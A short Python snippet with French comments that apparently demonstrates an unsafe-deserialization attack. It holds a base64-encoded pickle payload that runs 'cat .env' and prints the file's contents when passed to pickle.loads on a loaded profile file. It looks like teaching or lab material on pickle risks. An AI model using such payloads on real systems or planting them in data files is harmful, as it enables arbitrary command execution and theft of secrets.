import base64, pickle

# Ce base64 vient de ton print()
b64 = "ggASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhjYXQgLmVudpSFlFKULg=="

blob = base64.b64decode(b64)


# read blob from file
with open("alice_profile.pkl", "rb") as f:
    blob = f.read()
import pickle
out = pickle.loads(blob)  # ➜ Exécute 'cat .env' sur ta machine
print(out)  # Affiche le contenu de .env
